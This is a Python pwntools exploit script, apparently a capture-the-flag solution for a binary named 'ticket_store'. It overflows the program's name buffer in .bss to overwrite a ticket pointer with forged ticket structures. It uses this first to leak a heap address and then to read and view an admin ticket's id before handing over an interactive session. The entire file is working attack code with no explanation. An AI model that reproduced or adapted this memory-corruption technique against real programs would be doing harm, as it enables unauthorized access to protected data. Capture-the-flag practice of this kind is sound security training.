from pwn import *
import sys
import re

name_bss = 0x0404120
admin_ticket_bss = 0x04041D8

if __name__ == "__main__":

	#p = remote( '', ) 
	p = process( ["./ld-linux-x86-64.so.2", "--library-path", "libs/", "./ticket_store"] )
	#gdb.attach( p, '''b *0x4011C3
	#	continue''' 
	#)

	p.recvuntil( ": " )
	p.send( 'rnd_name\n' )
	p.recvuntil( "> " )

	for i in range( 0, 7 ):
		p.send( "1\n" )
		p.recvuntil( ": " ) # from
		p.send( "test1\n" )
		p.recvuntil( ": " ) # to 
		p.send( "test2\n" )
		p.recvuntil( ": " ) # cost
		p.send( "1337\n" ) 

		p.recvuntil( "> " )
 	
 	p.send( "5\n" ) # change name

 	payload = p64( admin_ticket_bss ) # from 
 	payload += p64( admin_ticket_bss ) # to
 	payload += p64( 0x1337 ) # date 
 	payload += p64( admin_ticket_bss ) # owner
 	payload += p32( 0x3137 ) # cost
 	payload += "11111111\x00" # id
 	payload = payload.ljust( 0x80, '\x00' )
 	payload += p64( name_bss )

 	p.recvuntil( ": " )
 	p.send( payload )
 	p.recvuntil( "> " )
 	p.send( '2\n' )
 	p.recvuntil( ": " )
 	p.send( "11111111\n" )

 	p.recvline()
 	heap_leak = p.recvline().strip().split( "From: " )[ 1 ]

 	addr = None

 	if len( heap_leak ) == 6:
 		heap_leak += '\x00' * 2

 		addr = u64( heap_leak ) 
 		print "leak = 0x%x" % addr # get leak to admin ticket
 	else:
 		p.close()
 		sys.exit( -1 )

 	p.recvuntil( "> " )
 	p.send( "5\n" ) # change name

 	payload  = p64( addr + 36 )
 	payload += p64( addr + 36 )
 	payload += p64( 0x1337 ) # date 
	payload += p64( addr + 36 ) # owner
	payload += p32( 0x3137 ) # cost
 	payload += "11111111\x00" # id
 	payload = payload.ljust( 0x80, '\x00' )
 	payload += p64( name_bss )

 	p.recvuntil( ": " )
 	p.send( payload )
 	p.recvuntil( "> " )
 	p.send( '2\n' )
 	p.recvuntil( ": " )
 	p.send( "11111111\n" )

 	p.recvline()
 	ticket_id = p.recvline().strip().split( "From: " )[ 1 ]
 	p.recvuntil( "> " )
 	p.send( "2\n" ) # view ticket
 	p.recvuntil( ": " )
 	p.send( ticket_id + '\n' )

 	print p.recvuntil( "> " )

 	p.interactive()